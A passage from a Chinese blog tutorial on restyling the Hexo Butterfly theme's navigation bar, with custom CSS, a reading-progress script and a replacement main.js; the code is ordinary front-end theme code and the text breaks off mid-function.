如果在做完本教程后发现一些特效消失了，一般都是因为main.js重做导致的，请找到该特效的教程并对main.js进行修改 3. 修改完以后移动端偶尔会出bug，如下图（暂未找到解决方案，但是概率很小，平时都可以正常使用） 移动端bug 实现效果 效果预览 步骤1. 打开Blog根目录/source/css/custom.css，路径中缺少的文件夹或文件直接创建即可，添加下列代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529#nav a:hover &#123; background: var(--anzhiyu-main); transition: 0.3s;&#125;#nav-totop:hover .totopbtn i &#123; opacity: 1;&#125;#nav-totop #percent &#123; font-size: 12px; background: var(--anzhiyu-white); color: var(--anzhiyu-main); width: 25px; height: 25px; border-radius: 35px; display: flex; justify-content: center; align-items: center; transition: 0.3s;&#125;.nav-fixed #nav-totop #percent,.page #nav-totop #percent &#123; background: var(--font-color); color: var(--card-bg); font-size: 13px;&#125;#nav-totop &#123; width: 35px;&#125;#page-header:not(.is-top-bar) #percent &#123; transition: 0.3s;&#125;#page-header:not(.is-top-bar) #nav-totop &#123; width: 0; opacity: 0; transition: width 0.3s, opacity 0.2s; margin-left: 0 !important;&#125;#nav-totop #percent &#123; font-weight: 700;&#125;#nav-totop:hover #percent &#123; opacity: 0; transform: scale(1.5); font-weight: 700;&#125;#page-header #nav #nav-right div &#123; margin-left: 0.5rem; padding: 0;&#125;#nav-totop &#123; display: flex; align-items: center; justify-content: center; transition: 0.3s;&#125;.nav-button &#123; cursor: pointer;&#125;div#menus &#123; display: flex; align-items: center;&#125;#page-header #nav .nav-button a &#123; height: 35px; width: 35px; display: flex; align-items: center; justify-content: center;&#125;#nav .site-page &#123; padding-bottom: 0px;&#125;#nav *::after &#123; background-color: transparent !important;&#125;/* 顶栏修改 */#nav .menus_items .menus_item .menus_item_child li a &#123; padding: 2px 16px;&#125;#nav .menus_items .menus_item .menus_item_child li:hover a &#123; color: white !important;&#125;#nav .menus_items .menus_item .menus_item_child li &#123; margin: 6px; border-radius: 5px; transition: all 0.3s; display: inline-block; margin: 0 3px;&#125;#nav .menus_items .menus_item .menus_item_child:before &#123; top: -19px;&#125;#site-name,.shuoshuo &#123; white-space: nowrap; overflow: hidden;&#125;#site-name &#123; padding: 0 8px; position: relative; display: flex; align-items: center; justify-content: center; transition: 0.3s;&#125;#blog_name #site-name i &#123; opacity: 0; position: absolute;&#125;#blog_name #site-name:hover .title &#123; opacity: 0; border-radius: 5px;&#125;#blog_name #site-name:hover i &#123; opacity: 1; transform: scale(1.01); color: white;&#125;/* 圆角隐藏 */ul.menus_item_child &#123; border-radius: 5px;&#125;/* 一级菜单居中 */#nav .menus_items &#123; position: absolute; width: fit-content; left: 50%; transform: translateX(-50%); display: flex; flex-direction: row; justify-content: center; align-items: center; height: 60px;&#125;#nav .menus_items .menus_item:hover .menus_item_child &#123; display: block; transform: translateX(-50%); right: auto; left: auto !important; padding: 6px 4px; box-sizing: content-box; line-height: 35px;&#125;#nav .menus_items .menus_item:hover &#123; padding: 0 5px 27px 5px !important; margin-bottom: -14.5px !important;&#125;#nav .menus_items .menus_item .menus_item_child &#123; top: 44px;&#125;@media screen and (min-width: 768px) &#123; .page .menus_item:hover&gt;a.site-page &#123; color: var(--anzhiyu-white) !important; background: var(--anzhiyu-main); transition: 0.3s; box-shadow: var(--anzhiyu-shadow-main); &#125;&#125;.nav-fixed #nav &#123; transform: translateY(58px) !important;&#125;#nav &#123; padding: 0 calc((100% - 1420px) / 2); backdrop-filter: saturate(180%) blur(20px);&#125;#nav a &#123; border-radius: 8px; color: var(--font-color);&#125;.page #nav a:hover &#123; color: var(--anzhiyu-white) !important; background: var(--anzhiyu-main); transition: 0.3s; box-shadow: var(--anzhiyu-shadow-main);&#125;#menus&gt;div.menus_items&gt;div&gt;a &#123; letter-spacing: 0.3rem; font-weight: 700; padding: 0em 0.3em 0em 0.5em; height: 35px; line-height: 35px;&#125;#nav .menus_items .menus_item &#123; padding: 0 5px; display: flex; flex-direction: column; margin: auto; align-items: center;&#125;#nav div#toggle-menu &#123; padding: 2px 0 4px 6px;&#125;#nav-totop .totopbtn i &#123; position: absolute; display: flex; opacity: 0;&#125;#page-name::before &#123; font-size: 18px; position: absolute; width: 100%; height: 100%; border-radius: 8px; color: white !important; top: 0; left: 0; content: &quot;回到顶部&quot;; background-color: var(--anzhiyu-theme); transition: all 0.3s; -webkit-transition: all 0.3s; -moz-transition: all 0.3s; -ms-transition: all 0.3s; -o-transition: all 0.3s; opacity: 0; box-shadow: 0 0 3px var(--anzhiyu-theme); line-height: 45px; /*如果垂直位置不居中可以微调此值，也可以删了*/&#125;#page-name:hover:before &#123; opacity: 1;&#125;#name-container &#123; transition: all 0.3s; -webkit-transition: all 0.3s; -moz-transition: all 0.3s; -ms-transition: all 0.3s; -o-transition: all 0.3s;&#125;#name-container:hover &#123; transform: translateX(-50%) scale(1.03);&#125;#page-name &#123; position: relative; padding: 10px 30px;&#125;center#name-container &#123; position: absolute; width: 100%; left: 50%; transform: translateX(-50%); font-family: &quot;ZhuZiAYuanJWD&quot;;&#125;.nav-fixed.nav-visible #name-container &#123; transition: 0.3s; transform: translate(-50%, 60px);&#125;.nav-fixed.nav-visible #menus .menus_items &#123; transform: translate(-50%); transition: 0.3s; line-height: 60px;&#125;.nav-fixed #menus .menus_items &#123; transform: translate(-50%, -60px); transition: 0.3s;&#125;.nav-fixed #name-container &#123; top: 15%; transition: 0.3s;&#125;#name-container &#123; bottom: 60px;&#125;.mask-name-container &#123; max-width: 1200px; width: 50%; height: 100%; position: absolute; overflow: hidden; left: 50%; transform: translateX(-50%);&#125;@media screen and (max-width: 992px) &#123; .mask-name-container &#123; width: 65%; &#125;&#125;@media screen and (max-width: 768px) &#123; .mask-name-container &#123; display: none; &#125;&#125;#sidebar #sidebar-menus .menus_items .site-page:hover &#123; color: var(--anzhiyu-white); border-radius: var(--anzhiyu-border-radius);&#125;#nav .menus_items .menus_item&gt;a&gt;i:last-child &#123; display: none;&#125;#nav #search-button &#123; font-size: 1.3em;&#125;@media screen and (min-width: 900px) &#123; #nav .back-home-button:hover &#123; box-shadow: var(--anzhiyu-shadow-main); &#125;&#125;.back-home-button:hover &#123; background: var(--anzhiyu-main); color: var(--anzhiyu-white) !important;&#125;.back-home-button &#123; display: flex; width: 35px; height: 35px; padding: 0 !important; align-items: center; justify-content: center; margin-right: 4px; transition: 0.3s; border-radius: 8px;&#125;.back-home-button:hover .back-menu-list-groups &#123; display: flex; opacity: 1; transition: 0.3s; top: 55px; pointer-events: auto; left: 0;&#125;.back-home-button .back-menu-list-groups &#123; position: absolute; top: 65px; left: 0; background: var(--anzhiyu-card-bg); border-radius: 12px; border: var(--style-border); flex-direction: column; font-size: 12px; color: var(--anzhiyu-secondtext); box-shadow: var(--anzhiyu-shadow-border); transition: 0s; opacity: 0; pointer-events: none;&#125;.back-home-button .back-menu-list-group &#123; display: flex; flex-direction: column;&#125;.back-home-button .back-menu-list-group .back-menu-list-title &#123; margin: 8px 0 0 16px; transition: 0.3s;&#125;.back-home-button .back-menu-list &#123; display: flex; flex-direction: column;&#125;.back-home-button .back-menu-list::before &#123; position: absolute; top: -22px; left: 0px; width: 100%; height: 25px; content: &quot;&quot;;&#125;.back-home-button .back-menu-list-group:hover .back-menu-list-title &#123; color: rgb(255, 255, 255);&#125;.back-home-button .back-menu-list-groups:hover &#123; border: var(--style-border-hover);&#125;.back-home-button .back-menu-list .back-menu-item &#123; display: flex; align-items: center; margin: 4px 8px; padding: 4px 8px !important; transition: 0.3s; border-radius: 8px;&#125;.back-home-button .back-menu-list .back-menu-item .back-menu-item-text &#123; font-size: var(--global-font-size); margin-left: 0.5rem; color: rgb(245, 247, 233); white-space: nowrap;&#125;#nav #blog_name &#123; flex-wrap: nowrap; height: 60px; display: flex; align-items: center; /* z-index: 102; */ transition: 0.3s;&#125;.back-home-button .back-menu-list .back-menu-item .back-menu-item-icon &#123; width: 24px; height: 24px; border-radius: 24px; background: var(--anzhiyu-secondbg);&#125;#page-header #nav .back-home-button &#123; cursor: pointer; position: relative;&#125;@media screen and (min-width: 1300px) &#123; #nav a:hover &#123; transform: scale(1.03); &#125;&#125;.back-home-button .back-menu-list .back-menu-item:hover .back-menu-item-text &#123; color: var(--anzhiyu-white);&#125;.back-menu-item-icon.loading img &#123; width: 25px;&#125;#page-header #nav #menus .nav-button.long a.totopbtn,#page-header #nav #menus .nav-button.long,#page-header #nav #menus .nav-button.long a.totopbtn span &#123; width: 70px;&#125;#page-header #nav #menus .nav-button.long a.totopbtn span &#123; border-radius: 35px; display: flex; justify-content: center; align-items: center; transition: 0.3s; white-space: nowrap;&#125;#page-header #nav #menus .nav-button.long a.totopbtn:hover &#123; border-radius: 35px; height: 30px;&#125;#nav #search-button &#123; padding-left: 0;&#125;#page-header #nav .nav-button &#123; margin-left: 0.5rem; padding: 0;&#125;#page-header:not(.is-top-bar) #nav-totop a &#123; display: none;&#125;#search-button a.site-page.social-icon.search span &#123; display: none;&#125; 2. 新建Blog根目录/source/js/nav_menu.js，写入下列代码，将最后一行的”快乐小凳凳”替换为你的名称123456789101112131415161718192021// 返回顶部 显示网页阅读进度window.onscroll = percent; // 执行函数// 页面百分比function percent() &#123; let a = document.documentElement.scrollTop || window.pageYOffset, // 卷去高度 b = Math.max( document.body.scrollHeight, document.documentElement.scrollHeight, document.body.offsetHeight, document.documentElement.offsetHeight, document.body.clientHeight, document.documentElement.clientHeight ) - document.documentElement.clientHeight, // 整个网页高度 减去 可视高度 result = Math.round((a / b) * 100), // 计算百分比 btn = document.querySelector(&quot;#percent&quot;); // 获取图标 result &lt;= 99 || (result = 99), (btn.innerHTML = result);&#125;document.getElementById(&quot;page-name&quot;).innerText = document.title.split(&quot; | 快乐小凳凳&quot;)[0]; 3. 替换Blog根目录/themes/butterfly/source/js/main.js为下列代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780document.addEventListener(&#x27;DOMContentLoaded&#x27;, function () &#123; let blogNameWidth, menusWidth, searchWidth, $nav let mobileSidebarOpen = false const adjustMenu = (init) =&gt; &#123; if (init) &#123; blogNameWidth = document.getElementById(&#x27;site-name&#x27;).offsetWidth const $menusEle = document.querySelectorAll(&#x27;#menus .menus_item&#x27;) menusWidth = 0 $menusEle.length &amp;&amp; $menusEle.forEach(i =&gt; &#123; menusWidth += i.offsetWidth &#125;) const $searchEle = document.querySelector(&#x27;#search-button&#x27;) searchWidth = $searchEle ? $searchEle.offsetWidth : 0 $nav = document.getElementById(&#x27;nav&#x27;) &#125; let hideMenuIndex = &#x27;&#x27; if (window.innerWidth &lt;= 768) hideMenuIndex = true else hideMenuIndex = blogNameWidth + menusWidth + searchWidth &gt; $nav.offsetWidth - 120 if (hideMenuIndex) &#123; $nav.classList.add(&#x27;hide-menu&#x27;) &#125; else &#123; $nav.classList.remove(&#x27;hide-menu&#x27;) &#125; &#125; // 初始化header const initAdjust = () =&gt; &#123; adjustMenu(true) $nav.classList.add(&#x27;show&#x27;) &#125; // sidebar menus const sidebarFn = &#123; open: () =&gt; &#123; btf.sidebarPaddingR() document.body.style.overflow = &#x27;hidden&#x27; btf.animateIn(document.getElementById(&#x27;menu-mask&#x27;), &#x27;to_show 0.5s&#x27;) document.getElementById(&#x27;sidebar-menus&#x27;).classList.add(&#x27;open&#x27;) mobileSidebarOpen = true &#125;, close: () =&gt; &#123; const $body = document.body $body.style.overflow = &#x27;&#x27; $body.style.paddingRight = &#x27;&#x27; btf.animateOut(document.getElementById(&#x27;menu-mask&#x27;), &#x27;to_hide 0.5s&#x27;) document.getElementById(&#x27;sidebar-menus&#x27;).classList.remove(&#x27;open&#x27;) mobileSidebarOpen = false &#125; &#125; /** * 首頁top_img底下的箭頭 */ const scrollDownInIndex = () =&gt; &#123; const $scrollDownEle = document.getElementById(&#x27;scroll-down&#x27;) $scrollDownEle &amp;&amp; $scrollDownEle.addEventListener(&#x27;click&#x27;, function () &#123; btf.scrollToDest(document.getElementById(&#x27;content-inner&#x27;).offsetTop, 300) &#125;) &#125; /** * 代碼 * 只適用於Hexo默認的代碼渲染 */ const addHighlightTool = function () &#123; const highLight = GLOBAL_CONFIG.highlight if (!highLight) return const isHighlightCopy = highLight.highlightCopy const isHighlightLang = highLight.highlightLang const isHighlightShrink = GLOBAL_CONFIG_SITE.isHighlightShrink const highlightHeightLimit = highLight.highlightHeightLimit const isShowTool = isHighlightCopy || isHighlightLang || isHighlightShrink !== undefined const $figureHighlight = highLight.plugin === &#x27;highlighjs&#x27; ? document.querySelectorAll(&#x27;figure.highlight&#x27;) : document.querySelectorAll(&#x27;pre[class*=&quot;language-&quot;]&#x27;) if (!((isShowTool || highlightHeightLimit) &amp;&amp; $figureHighlight.length)) return const isPrismjs = highLight.plugin === &#x27;prismjs&#x27; let highlightShrinkEle = &#x27;&#x27; let highlightCopyEle = &#x27;&#x27; const highlightShrinkClass = isHighlightShrink === true ? &#x27;closed&#x27; : &#x27;&#x27; if (isHighlightShrink !== undefined) &#123; highlightShrinkEle = `&lt;i class=&quot;fas fa-angle-down expand $&#123;highlightShrinkClass&#125;&quot;&gt;&lt;/i&gt;` &#125; if (isHighlightCopy) &#123; highlightCopyEle = &#x27;&lt;div class=&quot;copy-notice&quot;&gt;&lt;/div&gt;&lt;i class=&quot;fas fa-paste copy-button&quot;&gt;&lt;/i&gt;&#x27; &#125; const copy = (text, ctx) =&gt; &#123; if (document.queryCommandSupported &amp;&amp; document.queryCommandSupported(&#x27;copy&#x27;)) &#123; document.execCommand(&#x27;copy&#x27;) if (GLOBAL_CONFIG.Snackbar !== undefined) &#123; btf.snackbarShow(GLOBAL_CONFIG.copy.success) &#125; else &#123; const prevEle = ctx.previousElementSibling prevEle.innerText = GLOBAL_CONFIG.copy.success prevEle.style.opacity = 1 setTimeout(() =&gt; &#123; prevEle.style.opacity = 0 &#125;, 700) &#125; &#125; else &#123; if (GLOBAL_CONFIG.Snackbar !== undefined) &#123; btf.snackbarShow(GLOBAL_CONFIG.copy.noSupport) &#125; else &#123; ctx.previousElementSibling.innerText = GLOBAL_CONFIG.copy.noSupport &#125; &#125; &#125; // click events const highlightCopyFn = (ele) =&gt; &#123; const $buttonParent = ele.parentNode $buttonParent.classList.add(&#x27;copy-true&#x27;) const selection = window.getSelection() const range = document.createRange() if (isPrismjs) range.selectNodeContents($buttonParent.querySelectorAll(&#x27;pre code&#x27;)[0]) else range.selectNodeContents($buttonParent.querySelectorAll(&#x27;table .code pre&#x27;)[0]) selection.removeAllRanges() selection.addRange(range) const text = selection.toString() copy(text, ele.lastChild) selection.removeAllRanges() $buttonParent.classList.remove(&#x27;copy-true&#x27;) &#125; const highlightShrinkFn = (ele) =&gt; &#123; const $nextEle = [...ele.parentNode.children].slice(1) ele.firstChild.classList.toggle(&#x27;closed&#x27;) if (btf.isHidden($nextEle[$nextEle.length - 1])) &#123; $nextEle.forEach(e =&gt; &#123; e.style.display = &#x27;block&#x27; &#125;) &#125; else &#123; $nextEle.forEach(e =&gt; &#123; e.style.display = &#x27;none&#x27; &#125;) &#125; &#125; const highlightToolsFn = function (e) &#123; const $target = e.target.classList if ($target.contains(&#x27;expand&#x27;)) highlightShrinkFn(this) else if ($target.contains(&#x27;copy-button&#x27;)) highlightCopyFn(this) &#125; const expandCode = function () &#123; this.classList.toggle(&#x27;expand-done&#x27;) &#125; function createEle (lang, item, service) &#123; const fragment = document.createDocumentFragment() if (isShowTool) &#123; const hlTools = document.createElement(&#x27;div&#x27;) hlTools.className = `highlight-tools $&#123;highlightShrinkClass&#125;` hlTools.innerHTML = highlightShrinkEle + lang + highlightCopyEle hlTools.addEventListener(&#x27;click&#x27;, highlightToolsFn) fragment.appendChild(hlTools) &#125; if (highlightHeightLimit &amp;&amp; item.offsetHeight &gt; highlightHeightLimit + 30) &#123; const ele = document.createElement(&#x27;div&#x27;) ele.className = &#x27;code-expand-btn&#x27; ele.innerHTML = &#x27;&lt;i class=&quot;fas fa-angle-double-down&quot;&gt;&lt;/i&gt;&#x27; ele.addEventListener(&#x27;click&#x27;, expandCode) fragment.appendChild(ele) &#125; if (service === &#x27;hl&#x27;) &#123; item.insertBefore(fragment, item.firstChild) &#125; else &#123; item.parentNode.insertBefore(fragment, item) &#125; &#125; if (isHighlightLang) &#123; if (isPrismjs) &#123; $figureHighlight.forEach(function (item) &#123; const langName = item.getAttribute(&#x27;data-language&#x27;) ? item.getAttribute(&#x27;data-language&#x27;) : &#x27;Code&#x27; const highlightLangEle = `&lt;div class=&quot;code-lang&quot;&gt;$&#123;langName&#125;&lt;/div&gt;` btf.wrap(item, &#x27;figure&#x27;, &#123; class: &#x27;highlight&#x27; &#125;) createEle(highlightLangEle, item) &#125;) &#125; else &#123; $figureHighlight.forEach(function (item) &#123; let langName = item.getAttribute(&#x27;class&#x27;).split(&#x27; &#x27;)[1] if (langName === &#x27;plain&#x27; || langName === undefined) langName = &#x27;Code&#x27; const highlightLangEle = `&lt;div class=&quot;code-lang&quot;&gt;$&#123;langName&#125;&lt;/div&gt;` createEle(highlightLangEle, item, &#x27;hl&#x27;) &#125;) &#125; &#125; else &#123; if (isPrismjs) &#123; $figureHighlight.forEach(function (item) &#123; btf.wrap(item, &#x27;figure&#x27;, &#123; class: &#x27;highlight&#x27; &#125;) createEle(&#x27;&#x27;, item) &#125;) &#125; else &#123; $figureHighlight.forEach(function (item) &#123; createEle(&#x27;&#x27;, item, &#x27;hl&#x27;) &#125;) &#125; &#125; &#125; /** * PhotoFigcaption */ function addPhotoFigcaption () &#123; document.querySelectorAll(&#x27;#article-container img&#x27;).forEach(function (item) &#123; const parentEle = item.parentNode const altValue = item.title || item.alt if (altValue &amp;&amp; !parentEle.parentNode.classList.contains(&#x27;justified-gallery&#x27;)) &#123; const ele = document.createElement(&#x27;div&#x27;) ele.className = &#x27;img-alt is-center&#x27; ele.textContent = altValue parentEle.insertBefore(ele, item.nextSibling) &#125; &#125;) &#125; /** * Lightbox */ const runLightbox = () =&gt; &#123; btf.loadLightbox(document.querySelectorAll(&#x27;#article-container img:not(.no-lightbox)&#x27;)) &#125; /** * justified-gallery 圖庫排版 */ const runJustifiedGallery = function (ele) &#123; ele.forEach(item =&gt; &#123; const $imgList = item.querySelectorAll(&#x27;img&#x27;) $imgList.forEach(i =&gt; &#123; const dataLazySrc = i.getAttribute(&#x27;data-lazy-src&#x27;) if (dataLazySrc) i.src = dataLazySrc btf.wrap(i, &#x27;div&#x27;, &#123; class: &#x27;fj-gallery-item&#x27; &#125;) &#125;) &#125;) if (window.fjGallery) &#123; setTimeout(() =&gt; &#123; btf.initJustifiedGallery(ele) &#125;, 100) return &#125; const newEle = document.createElement(&#x27;link&#x27;) newEle.rel = &#x27;stylesheet&#x27; newEle.href = GLOBAL_CONFIG.source.justifiedGallery.css document.body.appendChild(newEle) getScript(`$&#123;GLOBAL_CONFIG.source.justifiedGallery.js&#125;`).then(() =&gt; &#123; btf.initJustifiedGallery(ele) &#125;) &#125; /** * 滾動處理 */ const scrollFn = function () &#123; const $rightside = document.getElementById(&#x27;rightside&#x27;) const innerHeight = window.innerHeight + 56 // 當滾動條小于 56 的時候 if (document.body.scrollHeight &lt;= innerHeight) &#123; $rightside.style.cssText = &#x27;opacity: 1; transform: translateX(-58px)&#x27; return &#125; // find the scroll direction function scrollDirection (currentTop) &#123; const result = currentTop &gt; initTop // true is down &amp; false is up initTop = currentTop return result &#125; let initTop = 0 let isChatShow = true const $header = document.getElementById(&#x27;page-header&#x27;) const isChatBtnHide = typeof chatBtnHide === &#x27;function&#x27; const isChatBtnShow = typeof chatBtnShow === &#x27;function&#x27; const scrollTask = btf.throttle(() =&gt; &#123; const currentTop = window.scrollY || document.documentElement.scrollTop const isDown = scrollDirection(currentTop) if (currentTop &gt; 56) &#123; $header.classList.add(&#x27;is-top-bar&#x27;) if (isDown) &#123; if ($header.classList.contains(&#x27;nav-visible&#x27;)) $header.classList.remove(&#x27;nav-visible&#x27;) if (isChatBtnShow &amp;&amp; isChatShow === true) &#123; chatBtnHide() isChatShow = false &#125; &#125; else &#123; if (!$header.classList.contains(&#x27;nav-visible&#x27;)) $header.classList.add(&#x27;nav-visible&#x27;) if (isChatBtnHide &amp;&amp; isChatShow === false) &#123; chatBtnShow() isChatShow = true &#125; &#125; $header.classList.add(&#x27;nav-fixed&#x27;) if (window.getComputedStyle($rightside).getPropertyValue(&#x27;opacity&#x27;) === &#x27;0&#x27;) &#123; $rightside.style.cssText = &#x27;opacity: 0.8; transform: translateX(-58px)&#x27; &#125; &#125; else &#123; if (currentTop === 0) &#123; $header.classList.remove(&#x27;is-top-bar&#x27;) &#125; $rightside.style.cssText = &quot;opacity: &#x27;&#x27;; transform: &#x27;&#x27;&quot; &#125; if (document.body.scrollHeight &lt;= innerHeight) &#123; $rightside.style.cssText = &#x27;opacity: 0.8; transform: translateX(-58px)&#x27; &#125; &#125;, 200) window.scrollCollect = scrollTask window.addEventListener(&#x27;scroll&#x27;, scrollCollect) &#125; /** * toc,anchor */ const scrollFnToDo = function () &#123; const isToc = GLOBAL_CONFIG_SITE.isToc const isAnchor = GLOBAL_CONFIG.isAnchor const $article = document.getElementById(&#x27;article-container&#x27;) if (!($article &amp;&amp; (isToc || isAnchor))) return let $tocLink, $cardToc, scrollPercent, autoScrollToc, isExpand if (isToc) &#123; const $cardTocLayout = document.getElementById(&#x27;card-toc&#x27;) $cardToc = $cardTocLayout.getElementsByClassName(&#x27;toc-content&#x27;)[0] $tocLink = $cardToc.querySelectorAll(&#x27;.toc-link&#x27;) const $tocPercentage = $cardTocLayout.querySelector(&#x27;.toc-percentage&#x27;) isExpand = $cardToc.classList.contains(&#x27;is-expand&#x27;) scrollPercent = currentTop =&gt; &#123; const docHeight = $article.clientHeight const winHeight = document.documentElement.clientHeight const headerHeight = $article.offsetTop const contentMath = (docHeight &gt; winHeight) ? (docHeight - winHeight) : (document.documentElement.scrollHeight - winHeight) const scrollPercent = (currentTop - headerHeight) / (contentMath) const scrollPercentRounded = Math.round(scrollPercent * 100) const percentage = (scrollPercentRounded &gt; 100) ? 100 : (scrollPercentRounded &lt;= 0) ? 0 : scrollPercentRounded $tocPercentage.textContent = percentage &#125; window.mobileToc = &#123; open: () =&gt; &#123; $cardTocLayout.style.cssText = &#x27;animation: toc-open .3s; opacity: 1; right: 55px&#x27; &#125;, close: () =&gt; &#123; $cardTocLayout.style.animation = &#x27;toc-close .2s&#x27; setTimeout(() =&gt; &#123; $cardTocLayout.style.cssText = &quot;opacity:&#x27;&#x27;; animation: &#x27;&#x27;; right: &#x27;&#x27;&quot; &#125;, 100) &#125; &#125; // toc元素點擊 $cardToc.addEventListener(&#x27;click&#x27;, e =&gt; &#123; e.preventDefault() const target = e.target.classList if (target.contains(&#x27;toc-content&#x27;)) return const $target = target.contains(&#x27;toc-link&#x27;) ? e.target : e.target.parentElement btf.scrollToDest(btf.getEleTop(document.getElementById(decodeURI($target.getAttribute(&#x27;href&#x27;)).replace(&#x27;#&#x27;, &#x27;&#x27;))), 300) if (window.innerWidth &lt; 900) &#123; window.mobileToc.close() &#125; &#125;) autoScrollToc = item =&gt; &#123; const activePosition = item.getBoundingClientRect().top const sidebarScrollTop = $cardToc.scrollTop if (activePosition &gt; (document.documentElement.clientHeight - 100)) &#123; $cardToc.scrollTop = sidebarScrollTop + 150 &#125; if (activePosition &lt; 100) &#123; $cardToc.scrollTop = sidebarScrollTop - 150 &#125; &#125; &#125; // find head position &amp; add active class const list = $article.querySelectorAll(&#x27;h1,h2,h3,h4,h5,h6&#x27;) let detectItem = &#x27;&#x27; const findHeadPosition = function (top) &#123; if (top === 0) &#123; return false &#125; let currentId = &#x27;&#x27; let currentIndex = &#x27;&#x27; list.forEach(function (ele, index) &#123; if (top &gt; btf.getEleTop(ele) - 80) &#123; const id = ele.id currentId = id ? &#x27;#&#x27; + encodeURI(id) : &#x27;&#x27; currentIndex = index &#125; &#125;) if (detectItem === currentIndex) return if (isAnchor) btf.updateAnchor(currentId) detectItem = currentIndex if (isToc) &#123; $cardToc.querySelectorAll(&#x27;.active&#x27;).forEach(i =&gt; &#123; i.classList.remove(&#x27;active&#x27;) &#125;) if (currentId === &#x27;&#x27;) &#123; return &#125; const currentActive = $tocLink[currentIndex] currentActive.classList.add(&#x27;active&#x27;) setTimeout(() =&gt; &#123; autoScrollToc(currentActive) &#125;, 0) if (isExpand) return let parent = currentActive.parentNode for (; !parent.matches(&#x27;.toc&#x27;); parent = parent.parentNode) &#123; if (parent.matches(&#x27;li&#x27;)) parent.classList.add(&#x27;active&#x27;) &#125; &#125; &#125; // main of scroll window.tocScrollFn = function () &#123; return btf.throttle(function () &#123; const currentTop = window.scrollY || document.documentElement.scrollTop isToc &amp;&amp; scrollPercent(currentTop) findHeadPosition(currentTop) &#125;, 100)() &#125; window.addEventListener(&#x27;scroll&#x27;, tocScrollFn) &#125; /** * Rightside */ const rightSideFn = &#123; switchReadMode: () =&gt; &#123; // read-mode const $body = document.body $body.classList.add(&#x27;read-mode&#x27;) const newEle = document.createElement(&#x27;button&#x27;) newEle.type = &#x27;button&#x27; newEle.className = &#x27;fas fa-sign-out-alt exit-readmode&#x27; $body.appendChild(newEle) function clickFn () &#123; $body.classList.remove(&#x27;read-mode&#x27;) newEle.remove() newEle.removeEventListener(&#x27;click&#x27;, clickFn) &#125; newEle.addEventListener(&#x27;click&#x27;, clickFn) &#125;, switchDarkMode: () =&gt; &#123; // Switch Between Light And Dark Mode const nowMode = document.documentElement.getAttribute(&#x27;data-theme&#x27;) === &#x27;dark&#x27; ? &#x27;dark&#x27; : &#x27;light&#x27; if (nowMode === &#x27;light&#x27;) &#123; activateDarkMode() saveToLocal.set(&#x27;theme&#x27;, &#x27;dark&#x27;, 2) GLOBAL_CONFIG.Snackbar !== undefined &amp;&amp; btf.snackbarShow(GLOBAL_CONFIG.Snackbar.day_to_night) &#125; else &#123; activateLightMode() saveToLocal.set(&#x27;theme&#x27;, &#x27;light&#x27;, 2) GLOBAL_CONFIG.Snackbar !== undefined &amp;&amp; btf.snackbarShow(GLOBAL_CONFIG.Snackbar.night_to_day) &#125; // handle some cases typeof utterancesTheme === &#x27;function&#x27; &amp;&amp; utterancesTheme() typeof changeGiscusTheme === &#x27;function&#x27; &amp;&amp; changeGiscusTheme() typeof FB === &#x27;object&#x27; &amp;&amp; window.loadFBComment &amp;&amp; window.loadFBComment() typeof runMermaid === &#x27;function&#x27; &amp;&amp; window.runMermaid() &#125;, showOrHideBtn: (e) =&gt; &#123; // rightside 點擊設置 按鈕 展開 const rightsideHideClassList = document.getElementById(&#x27;rightside-config-hide&#x27;).classList rightsideHideClassList.toggle(&#x27;show&#x27;) if (e.classList.contains(&#x27;show&#x27;)) &#123; rightsideHideClassList.add(&#x27;status&#x27;) setTimeout(() =&gt; &#123; rightsideHideClassList.remove(&#x27;status&#x27;) &#125;, 300) &#125; e.classList.toggle(&#x27;show&#x27;) &#125;, scrollToTop: () =&gt; &#123; // Back to top btf.scrollToDest(0, 500) &#125;, hideAsideBtn: () =&gt; &#123; // Hide aside const $htmlDom = document.documentElement.classList $htmlDom.contains(&#x27;hide-aside&#x27;) ? saveToLocal.set(&#x27;aside-status&#x27;, &#x27;show&#x27;, 2) : saveToLocal.set(&#x27;aside-status&#x27;, &#x27;hide&#x27;, 2) $htmlDom.toggle(&#x27;hide-aside&#x27;) &#125;, runMobileToc: () =&gt; &#123; if 